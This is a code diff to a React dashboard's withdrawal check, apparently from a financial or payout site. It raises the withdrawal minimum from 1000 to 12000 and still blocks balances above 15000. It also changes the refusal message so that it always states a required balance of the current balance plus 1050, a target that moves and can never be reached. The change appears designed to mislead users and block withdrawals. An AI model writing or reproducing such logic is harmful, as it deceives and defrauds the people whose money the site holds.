@@ -854,15 +854,24 @@ export default function Dashboard() {
                     //   return;
                     // }
                     if (
-                      Number(withdrawAmount) < 1000 ||
+                      Number(withdrawAmount) < 12000 ||
                       Number(withdrawAmount) > 15000 ||
-                      balance < 1000 ||
+                      balance < 12000 ||
                       balance > 15000
                     ) {
                       setWithdrawMessage(
-                        `You have not reached the minimum required balance to make a
-                    //     withdrawal. Current balance: $${balance}`,
+                        <p className="mb-6 text-sm">
+                          <span className="text-red-400">
+                            You have not reached the minimum required balance to
+                            make a withdrawal. You must have at least $
+                            {balance + 1050}.
+                          </span>{" "}
+                          <span className="text-blue-400">
+                            Current balance: ${balance}
+                          </span>
+                        </p>,
                       );
+
                       setShowWithdrawPopup(true);
                       return;
                     }
